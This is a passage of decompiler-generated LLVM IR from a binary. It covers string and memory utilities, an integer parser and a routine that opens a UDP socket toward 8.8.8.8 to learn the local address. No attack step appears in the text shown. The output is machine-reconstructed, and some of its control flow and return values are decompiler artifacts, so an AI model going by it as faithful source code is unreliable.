  uselistorder i32 29, { 0, 12, 1, 7, 5, 8, 2, 9, 3, 10, 4, 11, 13, 6 }
  uselistorder i32 (i32, i32, i32)* @function_1038c, { 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 6, 5, 4, 3, 2, 1, 0, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_20a88.197 to i32), { 4, 0, 1, 2, 3, 5 }
}

define i32 @function_1031c(i8* %arg1) local_unnamed_addr {
dec_label_pc_1031c:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_10320 = load i8, i8* %arg1, align 1
  %v2_10324 = icmp eq i8 %v3_10320, 0
  %v0_10328 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10324, i32 %v0_10328)
  br label %dec_label_pc_10330

dec_label_pc_10330:                               ; preds = %dec_label_pc_10330, %dec_label_pc_1031c
  %v0_10330 = phi i32 [ %v1_10330, %dec_label_pc_10330 ], [ 0, %dec_label_pc_1031c ]
  %v1_10330 = add i32 %v0_10330, 1
  %v2_10334 = add i32 %v1_10330, %tmp
  %v3_10334 = inttoptr i32 %v2_10334 to i8*
  %v4_10334 = load i8, i8* %v3_10334, align 1
  %v2_10338 = icmp eq i8 %v4_10334, 0
  br i1 %v2_10338, label %dec_label_pc_10340, label %dec_label_pc_10330

dec_label_pc_10340:                               ; preds = %dec_label_pc_10330
  ret i32 %v1_10330
}

define i32 @function_10344(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10344:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_10344 = load i8, i8* %arg1, align 1
  %v3_10344 = zext i8 %v2_10344 to i32
  store i32 %v3_10344, i32* @r2, align 4
  %v2_10348 = icmp eq i8 %v2_10344, 0
  br i1 %v2_10348, label %bb, label %dec_label_pc_10354

bb:                                               ; preds = %dec_label_pc_10344
  store i32 %v3_10344, i32* @ip, align 4
  br label %dec_label_pc_10368

dec_label_pc_10354:                               ; preds = %dec_label_pc_10344
  br label %dec_label_pc_10358

dec_label_pc_10358:                               ; preds = %dec_label_pc_10358, %dec_label_pc_10354
  %v0_10358 = phi i32 [ %v1_10358, %dec_label_pc_10358 ], [ 0, %dec_label_pc_10354 ]
  %v1_10358 = add i32 %v0_10358, 1
  store i32 %v1_10358, i32* @ip, align 4
  %v2_1035c = add i32 %v1_10358, %tmp
  %v3_1035c = inttoptr i32 %v2_1035c to i8*
  %v4_1035c = load i8, i8* %v3_1035c, align 1
  %v2_10360 = icmp eq i8 %v4_1035c, 0
  br i1 %v2_10360, label %dec_label_pc_10368, label %dec_label_pc_10358

dec_label_pc_10368:                               ; preds = %dec_label_pc_10358, %bb
  %v0_10368 = phi i32 [ %v3_10344, %bb ], [ %v1_10358, %dec_label_pc_10358 ]
  br label %dec_label_pc_10374

dec_label_pc_10370:                               ; preds = %dec_label_pc_10374
  %v0_10370 = load i32, i32* %r1.global-to-local, align 4
  %v1_10370 = add i32 %v0_10370, 1
  %v2_10370 = inttoptr i32 %v1_10370 to i8*
  %v3_10370 = load i8, i8* %v2_10370, align 1
  %v4_10370 = zext i8 %v3_10370 to i32
  store i32 %v4_10370, i32* @r2, align 4
  store i32 %v1_10370, i32* %r1.global-to-local, align 4
  %v0_10374.pr = load i32, i32* @r3, align 4
  br label %dec_label_pc_10374

dec_label_pc_10374:                               ; preds = %dec_label_pc_10368, %dec_label_pc_10370
  %v0_1037c.off0 = phi i8 [ %v2_10344, %dec_label_pc_10368 ], [ %v3_10370, %dec_label_pc_10370 ]
  %v0_10374 = phi i32 [ %v0_10368, %dec_label_pc_10368 ], [ %v0_10374.pr, %dec_label_pc_10370 ]
  %v1_10374 = add i32 %v0_10374, -1
  store i32 %v1_10374, i32* @r3, align 4
  %v3_10378 = icmp eq i32 %v0_10374, 0
  %v2_1037c = load i32, i32* @r0, align 4
  %v3_1037c = inttoptr i32 %v2_1037c to i8*
  store i8 %v0_1037c.off0, i8* %v3_1037c, align 1
  %v4_1037c = load i32, i32* @r0, align 4
  %v5_1037c = add i32 %v4_1037c, 1
  store i32 %v5_1037c, i32* @r0, align 4
  br i1 %v3_10378, label %dec_label_pc_10384, label %dec_label_pc_10370

dec_label_pc_10384:                               ; preds = %dec_label_pc_10374
  %v0_10384 = load i32, i32* @ip, align 4
  ret i32 %v0_10384

; uselistorder directives
  uselistorder i32 %v0_10374, { 1, 0 }
  uselistorder i32 %v1_10358, { 0, 1, 3, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10374, { 1, 0 }
}

define i32 @function_1038c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1038c:
  %v2_1038c = icmp eq i32 %arg3, 0
  %v0_10390 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1038c, i32 %v0_10390)
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_10398

dec_label_pc_10398:                               ; preds = %dec_label_pc_10398, %dec_label_pc_1038c
  %v0_10398 = phi i32 [ %v1_103a0, %dec_label_pc_10398 ], [ 0, %dec_label_pc_1038c ]
  %v2_10398 = add i32 %v0_10398, %arg2
  %v3_10398 = inttoptr i32 %v2_10398 to i8*
  %v4_10398 = load i8, i8* %v3_10398, align 1
  %v4_1039c = add i32 %v0_10398, %arg1
  %v5_1039c = inttoptr i32 %v4_1039c to i8*
  store i8 %v4_10398, i8* %v5_1039c, align 1
  %v0_103a0 = load i32, i32* @ip, align 4
  %v1_103a0 = add i32 %v0_103a0, 1
  store i32 %v1_103a0, i32* @ip, align 4
  %v9_103a4 = icmp eq i32 %v1_103a0, %arg3
  br i1 %v9_103a4, label %dec_label_pc_103ac, label %dec_label_pc_10398

dec_label_pc_103ac:                               ; preds = %dec_label_pc_10398
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_103a0, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_103b0() local_unnamed_addr {
dec_label_pc_103b0:
  %r2.global-to-local = alloca i32, align 4
  %v0_103b0 = load i32, i32* @r1, align 4
  %v2_103b0 = icmp eq i32 %v0_103b0, 0
  %v0_103b4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_103b0, i32 %v0_103b4)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_103bc

dec_label_pc_103bc:                               ; preds = %dec_label_pc_103bc, %dec_label_pc_103b0
  %v2_103c0 = phi i32 [ %v1_103c4, %dec_label_pc_103bc ], [ 0, %dec_label_pc_103b0 ]
  store i32 0, i32* @r3, align 4
  %v3_103c0 = load i32, i32* @r0, align 4
  %v4_103c0 = add i32 %v3_103c0, %v2_103c0
  %v5_103c0 = inttoptr i32 %v4_103c0 to i8*
  store i8 0, i8* %v5_103c0, align 1
  %v0_103c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_103c4 = add i32 %v0_103c4, 1
  store i32 %v1_103c4, i32* %r2.global-to-local, align 4
  %v1_103c8 = load i32, i32* @r1, align 4
  %v9_103c8 = icmp eq i32 %v1_103c4, %v1_103c8
  br i1 %v9_103c8, label %dec_label_pc_103d0, label %dec_label_pc_103bc

dec_label_pc_103d0:                               ; preds = %dec_label_pc_103bc
  %v1_103d0 = load i32, i32* @r0, align 4
  ret i32 %v1_103d0

; uselistorder directives
  uselistorder i32 %v1_103c4, { 1, 2, 0 }
}

define i32 @function_103d4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_103d4:
  %v7_103e8 = icmp sgt i32 %arg4, %arg2
  br i1 %v7_103e8, label %dec_label_pc_103f0, label %dec_label_pc_103f8

dec_label_pc_103f0:                               ; preds = %dec_label_pc_1040c, %dec_label_pc_103f8, %dec_label_pc_103d4, %dec_label_pc_10438
  %storemerge = phi i32 [ %v1_10438, %dec_label_pc_10438 ], [ -1, %dec_label_pc_103d4 ], [ -1, %dec_label_pc_103f8 ], [ -1, %dec_label_pc_1040c ]
  ret i32 %storemerge

dec_label_pc_103f8:                               ; preds = %dec_label_pc_103d4
  %tmp12 = icmp slt i32 %arg2, 1
  br i1 %tmp12, label %dec_label_pc_103f0, label %dec_label_pc_10400

dec_label_pc_10400:                               ; preds = %dec_label_pc_103f8
  br label %dec_label_pc_10418

dec_label_pc_1040c:                               ; preds = %bb, %dec_label_pc_1042c
  %v1_104183 = phi i32 [ %v1_1042c, %dec_label_pc_1042c ], [ 0, %bb ]
  %v1_1040c = add i32 %v0_10438, 1
  %v9_10410 = icmp eq i32 %v1_1040c, %arg2
  br i1 %v9_10410, label %dec_label_pc_103f0, label %dec_label_pc_10418

dec_label_pc_10418:                               ; preds = %dec_label_pc_1040c, %dec_label_pc_10400
  %v0_10438 = phi i32 [ %v1_1040c, %dec_label_pc_1040c ], [ 0, %dec_label_pc_10400 ]
  %v1_10418 = phi i32 [ %v1_104183, %dec_label_pc_1040c ], [ 0, %dec_label_pc_10400 ]
  %v2_10418 = add i32 %v1_10418, %arg3
  %v3_10418 = inttoptr i32 %v2_10418 to i8*
  %v4_10418 = load i8, i8* %v3_10418, align 1
  %v2_1041c = add i32 %v0_10438, %arg1
  %v3_1041c = inttoptr i32 %v2_1041c to i8*
  %v4_1041c = load i8, i8* %v3_1041c, align 1
  %v9_10420 = icmp eq i8 %v4_1041c, %v4_10418
  br i1 %v9_10420, label %dec_label_pc_1042c, label %bb

bb:                                               ; preds = %dec_label_pc_10418
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_1040c

dec_label_pc_1042c:                               ; preds = %dec_label_pc_10418
  %v1_1042c = add i32 %v1_10418, 1
  store i32 %v1_1042c, i32* @ip, align 4
  %v9_10430 = icmp eq i32 %v1_1042c, %arg4
  br i1 %v9_10430, label %dec_label_pc_10438, label %dec_label_pc_1040c

dec_label_pc_10438:                               ; preds = %dec_label_pc_1042c
  %v1_10438 = add i32 %v0_10438, 1
  br label %dec_label_pc_103f0

; uselistorder directives
  uselistorder i32 %v1_1042c, { 1, 2, 0 }
  uselistorder i32 %v1_10418, { 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1040c, { 1, 0 }
  uselistorder label %dec_label_pc_103f0, { 3, 0, 1, 2 }
}

define i32 @function_10440(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10440:
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_10440 = load i32, i32* @r4, align 4
  %v12_10440 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10450

dec_label_pc_10450:                               ; preds = %.thread, %dec_label_pc_10464, %bb, %dec_label_pc_10440
  %v0_10450 = phi i32 [ %tmp, %dec_label_pc_10440 ], [ %v5_10450, %bb ], [ %v5_10450, %dec_label_pc_10464 ], [ %v5_10450, %.thread ]
  %v1_10450 = inttoptr i32 %v0_10450 to i8*
  %v2_10450 = load i8, i8* %v1_10450, align 1
  %v5_10450 = add i32 %v0_10450, 1
  store i32 %v5_10450, i32* %r5.global-to-local, align 4
  %v7_10454 = icmp eq i8 %v2_10450, 9
  br i1 %v7_10454, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_10450
  br label %dec_label_pc_10450

bb:                                               ; preds = %dec_label_pc_10450
  %v3_10450 = zext i8 %v2_10450 to i32
  %v8_10458 = icmp eq i8 %v2_10450, 32
  store i32 %v3_10450, i32* @r4, align 4
  br i1 %v8_10458, label %dec_label_pc_10450, label %dec_label_pc_10464

dec_label_pc_10464:                               ; preds = %bb
  %v7_10464 = icmp eq i8 %v2_10450, 10
  br i1 %v7_10464, label %dec_label_pc_10450, label %dec_label_pc_1046c

dec_label_pc_1046c:                               ; preds = %dec_label_pc_10464
  %v7_1046c = icmp eq i8 %v2_10450, 45
  br i1 %v7_1046c, label %dec_label_pc_1055c, label %dec_label_pc_10474

dec_label_pc_10474:                               ; preds = %dec_label_pc_1046c
  %v7_10474 = icmp eq i8 %v2_10450, 43
  br i1 %v7_10474, label %bb44, label %dec_label_pc_10484

bb44:                                             ; preds = %dec_label_pc_10474
  %v2_10478 = inttoptr i32 %v5_10450 to i8*
  %v3_10478 = load i8, i8* %v2_10478, align 1
  %v4_10478 = zext i8 %v3_10478 to i32
  store i32 %v4_10478, i32* @r4, align 4
  %v6_10478 = add i32 %v0_10450, 2
  store i32 %v6_10478, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10484

dec_label_pc_10484:                               ; preds = %bb44, %dec_label_pc_10474, %dec_label_pc_1055c
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_1055c ], [ 2147483647, %dec_label_pc_10474 ], [ 2147483647, %bb44 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_1055c ], [ 0, %dec_label_pc_10474 ], [ 0, %bb44 ]
  store i32 %storemerge1, i32* @r7, align 4
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_1048c = call i32 @function_10974(i32 %storemerge1, i32 %arg2)
  %v0_10490 = load i32, i32* @r7, align 4
  store i32 %v0_10490, i32* @r0, align 4
  store i32 %arg2, i32* %r8.global-to-local, align 4
  %v0_10498 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_10498, i32* @r1, align 4
  %v0_1049c = call i32 @function_10878()
  %v0_104ac.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_104ac.outer

dec_label_pc_104ac.outer:                         ; preds = %.thread5, %dec_label_pc_10484
  %v2_10528.ph = phi i32 [ %v5_10528, %.thread5 ], [ 0, %dec_label_pc_10484 ]
  %v1_104ec.ph = phi i32 [ %v4_1052c, %.thread5 ], [ %v0_104ac.pre, %dec_label_pc_10484 ]
  %v1_10504.ph = phi i32 [ 1, %.thread5 ], [ 0, %dec_label_pc_10484 ]
  %v3_104f8 = icmp uge i32 %v2_10528.ph, %v0_1049c
  %v9_104f8 = icmp eq i32 %v2_10528.ph, %v0_1049c
  %v2_104fc = xor i1 %v3_104f8, true
  %v3_104fc = or i1 %v9_104f8, %v2_104fc
  %v2_10500 = xor i1 %v9_104f8, true
  %v3_10500 = and i1 %v3_104f8, %v2_10500
  %v2_10520 = icmp eq i1 %v9_104f8, false
  br label %dec_label_pc_104ac

dec_label_pc_104ac:                               ; preds = %dec_label_pc_104ac.outer, %dec_label_pc_10534
  %v1_10504 = phi i32 [ -1, %dec_label_pc_10534 ], [ %v1_10504.ph, %dec_label_pc_104ac.outer ]
  %v1_104ec = phi i32 [ %v3_10534, %dec_label_pc_10534 ], [ %v1_104ec.ph, %dec_label_pc_104ac.outer ]
  %v1_104ac = urem i32 %v1_104ec, 256
  %v1_104b0 = add nsw i32 %v1_104ac, -48
  %v1_104b8 = add nsw i32 %v1_104ac, -97
  %v1_104bc = add i32 %v1_104ec, -48
  %v1_104c0 = add nsw i32 %v1_104ac, -65
  %tmp75 = icmp ult i32 %v1_104b0, 10
  br i1 %tmp75, label %dec_label_pc_104f0, label %dec_label_pc_104c8

dec_label_pc_104c8:                               ; preds = %dec_label_pc_104ac
  %v2_104c8 = icmp ugt i32 %v1_104c0, 24
  %v7_104c8 = icmp eq i32 %v1_104c0, 25
  %v2_104cc = xor i1 %v7_104c8, true
  %v3_104cc = and i1 %v2_104c8, %v2_104cc
  br i1 %v3_104cc, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_104c8
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_104c8, %bb45
  %v0_104e014 = phi i32 [ %v1_104bc, %dec_label_pc_104c8 ], [ 0, %bb45 ]
  %v2_104d0 = xor i1 %v2_104c8, true
  %v3_104d0 = or i1 %v7_104c8, %v2_104d0
  br i1 %v3_104d0, label %bb47, label %bb48

bb47:                                             ; preds = %bb46
  br label %bb48

bb48:                                             ; preds = %bb46, %bb47
  %v0_104e0 = phi i32 [ %v0_104e014, %bb46 ], [ 1, %bb47 ]
  br i1 %v3_104cc, label %bb49, label %bb50

bb49:                                             ; preds = %bb48
  %v6_104d8 = icmp ugt i32 %v1_104b8, 24
  %v11_104d8 = icmp eq i32 %v1_104b8, 25
  br label %bb50

bb50:                                             ; preds = %bb48, %bb49
  %v1_104dc = phi i1 [ %v7_104c8, %bb48 ], [ %v11_104d8, %bb49 ]
  %v0_104dc = phi i1 [ %v2_104c8, %bb48 ], [ %v6_104d8, %bb49 ]
  %v2_104dc = xor i1 %v1_104dc, true
  %v3_104dc = and i1 %v0_104dc, %v2_104dc
  br i1 %v3_104dc, label %dec_label_pc_10540, label %dec_label_pc_104e0

dec_label_pc_104e0:                               ; preds = %bb50
  %v2_104e0 = icmp eq i32 %v0_104e0, 0
  %. = select i1 %v2_104e0, i32 87, i32 55
  %v2_104ec = sub i32 %v1_104ec, %.
  br label %dec_label_pc_104f0

dec_label_pc_104f0:                               ; preds = %dec_label_pc_104ac, %dec_label_pc_104e0
  %v0_1050429 = phi i32 [ %v1_104c0, %dec_label_pc_104ac ], [ %., %dec_label_pc_104e0 ]
  %v3_10528 = phi i32 [ %v1_104bc, %dec_label_pc_104ac ], [ %v2_104ec, %dec_label_pc_104e0 ]
  %v1_104f0 = load i32, i32* %r6.global-to-local, align 4
  %v2_104f0 = sub i32 %v3_10528, %v1_104f0
  %v4_104f0 = xor i32 %v1_104f0, %v3_10528
  %v5_104f0 = xor i32 %v2_104f0, %v3_10528
  %v6_104f0 = and i32 %v5_104f0, %v4_104f0
  %v7_104f0 = icmp slt i32 %v6_104f0, 0
  %v8_104f0 = icmp slt i32 %v2_104f0, 0
  %v2_104f4 = xor i1 %v8_104f0, %v7_104f0
  br i1 %v2_104f4, label %dec_label_pc_104f8, label %dec_label_pc_10540

dec_label_pc_104f8:                               ; preds = %dec_label_pc_104f0
  br i1 %v3_104fc, label %bb53, label %bb54

bb53:                                             ; preds = %dec_label_pc_104f8
  br label %bb54

bb54:                                             ; preds = %dec_label_pc_104f8, %bb53
  %v0_1050428 = phi i32 [ %v0_1050429, %dec_label_pc_104f8 ], [ 0, %bb53 ]
  br i1 %v3_10500, label %bb55, label %bb56

bb55:                                             ; preds = %bb54
  br label %bb56

bb56:                                             ; preds = %bb54, %bb55
  %v0_10504 = phi i32 [ %v0_1050428, %bb54 ], [ 1, %bb55 ]
  %tmp76 = icmp slt i32 %v1_10504, 0
  %v4_10504 = zext i1 %tmp76 to i32
  %v5_10504 = or i32 %v0_10504, %v4_10504
  %v7_10504 = icmp eq i32 %v5_10504, 0
  br i1 %v7_10504, label %dec_label_pc_1050c, label %dec_label_pc_10534

dec_label_pc_1050c:                               ; preds = %bb56
  %v1_10518 = load i32, i32* %r8.global-to-local, align 4
  %v2_10518 = sub i32 %v3_10528, %v1_10518
  %v4_10518 = xor i32 %v1_10518, %v3_10528
  %v5_10518 = xor i32 %v2_10518, %v3_10528
  %v6_10518 = and i32 %v5_10518, %v4_10518
  %v7_10518 = icmp slt i32 %v6_10518, 0
  %v8_10518 = icmp slt i32 %v2_10518, 0
  %v9_10518 = icmp eq i32 %v3_10528, %v1_10518
  %v3_1051c = xor i1 %v8_10518, %v7_10518
  %v4_1051c = or i1 %v9_10518, %v3_1051c
  br i1 %v4_1051c, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_1050c
  br label %.thread5

thread-pre-split:                                 ; preds = %dec_label_pc_1050c
  br i1 %v2_10520, label %.thread5, label %dec_label_pc_10534

.thread5:                                         ; preds = %thread-pre-split, %thread-pre-split.thread
  %v4_10528 = mul i32 %v1_104f0, %v2_10528.ph
  %v5_10528 = add i32 %v4_10528, %v3_10528
  %v1_1052c = load i32, i32* %r5.global-to-local, align 4
  %v2_1052c = inttoptr i32 %v1_1052c to i8*
  %v3_1052c = load i8, i8* %v2_1052c, align 1
  %v4_1052c = zext i8 %v3_1052c to i32
  %v6_1052c = add i32 %v1_1052c, 1
  store i32 %v6_1052c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_104ac.outer

dec_label_pc_10534:                               ; preds = %thread-pre-split, %bb56
  %v0_10534 = load i32, i32* %r5.global-to-local, align 4
  %v1_10534 = inttoptr i32 %v0_10534 to i8*
  %v2_10534 = load i8, i8* %v1_10534, align 1
  %v3_10534 = zext i8 %v2_10534 to i32
  %v5_10534 = add i32 %v0_10534, 1
  store i32 %v5_10534, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_104ac

dec_label_pc_10540:                               ; preds = %dec_label_pc_104f0, %bb50
  %v1_10540 = icmp slt i32 %v1_10504, 0
  %v0_1056c = load i32, i32* %sl.global-to-local, align 4
  %v2_1056c = icmp eq i32 %v0_1056c, 0
  br i1 %v1_10540, label %dec_label_pc_1056c, label %dec_label_pc_10548

dec_label_pc_10548:                               ; preds = %dec_label_pc_10540
  br i1 %v2_1056c, label %bb60, label %bb59

bb59:                                             ; preds = %dec_label_pc_10548
  %v2_1054c = sub i32 0, %v2_10528.ph
  br label %bb60

bb60:                                             ; preds = %.thread32, %bb61, %dec_label_pc_10548, %bb59
  %v1_10558 = phi i32 [ -2147483648, %bb61 ], [ %v2_10528.ph, %dec_label_pc_10548 ], [ %v2_1054c, %bb59 ], [ 2147483647, %.thread32 ]
  store i32 %v3_10440, i32* @r4, align 4
  store i32 %v12_10440, i32* @r7, align 4
  ret i32 %v1_10558

dec_label_pc_1055c:                               ; preds = %dec_label_pc_1046c
  %v1_1055c = inttoptr i32 %v5_10450 to i8*
  %v2_1055c = load i8, i8* %v1_1055c, align 1
  %v3_1055c = zext i8 %v2_1055c to i32
  store i32 %v3_1055c, i32* @r4, align 4
  %v5_1055c = add i32 %v0_10450, 2
  store i32 %v5_1055c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10484

dec_label_pc_1056c:                               ; preds = %dec_label_pc_10540
  br i1 %v2_1056c, label %.thread32, label %bb61

.thread32:                                        ; preds = %dec_label_pc_1056c
  br label %bb60

bb61:                                             ; preds = %dec_label_pc_1056c
  br label %bb60

; uselistorder directives
  uselistorder i1 %v2_1056c, { 1, 0 }
  uselistorder i32 %v2_10518, { 1, 0 }
  uselistorder i32 %v1_10518, { 1, 0, 2 }
  uselistorder i32 %v2_104f0, { 1, 0 }
  uselistorder i32 %v3_10528, { 0, 6, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_104c8, { 1, 2, 0 }
  uselistorder i1 %v2_104c8, { 1, 0, 2 }
  uselistorder i32 %v1_104ac, { 1, 2, 0 }
  uselistorder i32 %v1_104ec, { 1, 2, 0 }
  uselistorder i32 %v1_10504, { 1, 0 }
  uselistorder i1 %v9_104f8, { 1, 0, 2 }
  uselistorder i1 %v3_104f8, { 1, 0 }
  uselistorder i32 %v2_10528.ph, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v0_1049c, { 1, 0 }
  uselistorder i32 %v5_10450, { 3, 4, 5, 2, 1, 0 }
  uselistorder i8 %v2_10450, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_10450, { 0, 1, 3, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 5, 2, 4, 3, 6, 7 }
  uselistorder i32 25, { 17, 18, 9, 2, 10, 3, 11, 4, 12, 0, 13, 5, 14, 1, 15, 6, 7, 16, 8, 19 }
  uselistorder i8 32, { 9, 10, 11, 0, 12, 13, 14, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i8 9, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %bb60, { 1, 0, 3, 2 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %bb54, { 1, 0 }
  uselistorder label %dec_label_pc_104f0, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_104ac, { 1, 0 }
  uselistorder label %dec_label_pc_10484, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10450, { 1, 2, 0, 3 }
}

define i32 @function_1057c(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1057c:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_1057c = load i32, i32* @r4, align 4
  store i32 %v3_1057c, i32* %stack_var_-24, align 4
  %v12_1057c = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10594

dec_label_pc_10594:                               ; preds = %dec_label_pc_105b8.dec_label_pc_10594_crit_edge, %dec_label_pc_1057c
  %v0_10598 = phi i32 [ %v0_10598.pre, %dec_label_pc_105b8.dec_label_pc_10594_crit_edge ], [ %arg3, %dec_label_pc_1057c ]
  %v1_105a0 = call i32 @function_10b74(i32 %v0_10598)
  %v7_105a4 = icmp eq i32 %v1_105a0, 1
  %v0_105ac = load i32, i32* %r5.global-to-local, align 4
  br i1 %v7_105a4, label %dec_label_pc_105ac, label %dec_label_pc_105c4

dec_label_pc_105ac:                               ; preds = %dec_label_pc_10594
  %v1_105ac = add i32 %v0_105ac, 1
  store i32 %v1_105ac, i32* %r5.global-to-local, align 4
  %v1_105b0 = load i32, i32* %r8.global-to-local, align 4
  %v6_105b4 = icmp slt i32 %v1_105ac, %v1_105b0
  br i1 %v6_105b4, label %dec_label_pc_105b8, label %.loopexit

dec_label_pc_105b8:                               ; preds = %dec_label_pc_105ac
  %v0_105b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_105b8 = inttoptr i32 %v0_105b8 to i8*
  %v2_105b8 = load i8, i8* %v1_105b8, align 1
  %v5_105b8 = add i32 %v0_105b8, 1
  store i32 %v5_105b8, i32* %r4.global-to-local, align 4
  %v7_105bc = icmp eq i8 %v2_105b8, 10
  br i1 %v7_105bc, label %dec_label_pc_105c4, label %dec_label_pc_105b8.dec_label_pc_10594_crit_edge

dec_label_pc_105b8.dec_label_pc_10594_crit_edge:  ; preds = %dec_label_pc_105b8
  %v0_10598.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10594

dec_label_pc_105c4:                               ; preds = %dec_label_pc_10594, %dec_label_pc_105b8
  %v0_105c4 = phi i32 [ %v1_105ac, %dec_label_pc_105b8 ], [ %v0_105ac, %dec_label_pc_10594 ]
  %v2_105c4 = icmp eq i32 %v0_105c4, 0
  br i1 %v2_105c4, label %bb, label %.loopexit

bb:                                               ; preds = %dec_label_pc_105c4
  store i32 0, i32* @r7, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_105ac, %dec_label_pc_105c4, %bb
  %v0_105cc = load i32, i32* @r7, align 4
  %v2_105d0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_105d0, i32* @r4, align 4
  store i32 %v12_1057c, i32* @r7, align 4
  ret i32 %v0_105cc

; uselistorder directives
  uselistorder label %.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_105c4, { 1, 0 }
}

define i32 @function_105d8() local_unnamed_addr {
dec_label_pc_105d8:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  store i32 16, i32* %r6.global-to-local, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v0_105e8 = call i32 @function_11204()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_105f0 = inttoptr i32 %v0_105e8 to i32*
  store i32 0, i32* %v2_105f0, align 4
  %v0_105fc = load i32, i32* %r4.global-to-local, align 4
  %v3_10600 = call i32 @function_115f4(i32 2, i32 2, i32 %v0_105fc)
  %v7_10604 = icmp eq i32 %v3_10600, -1
  store i32 %v3_10600, i32* %r5.global-to-local, align 4
  br i1 %v7_10604, label %bb, label %dec_label_pc_10614

bb:                                               ; preds = %dec_label_pc_105d8
  %v1_1060c = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10660

dec_label_pc_10614:                               ; preds = %dec_label_pc_105d8
  %v2_10620 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10620, i32* %r4.global-to-local, align 4
  %v0_1062c = load i32, i32* %r6.global-to-local, align 4
  store i32 2, i32* %stack_var_-36, align 4
  %v3_10640 = call i32 @function_113dc(i32 %v3_10600, i32 %v2_10620, i32 %v0_1062c)
  %v2_10648 = ptrtoint i32* %stack_var_-20 to i32
  %v0_1064c = load i32, i32* %r5.global-to-local, align 4
  %v3_10650 = call i32 @function_11414(i32 %v0_1064c, i32 %v2_10620, i32 %v2_10648)
  %v1_10658 = call i32 @function_10ddc(i32 %v0_1064c)
  br label %dec_label_pc_10660

dec_label_pc_10660:                               ; preds = %bb, %dec_label_pc_10614
  %storemerge = phi i32 [ 134744072, %dec_label_pc_10614 ], [ %v1_1060c, %bb ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_10600, { 1, 2, 0 }
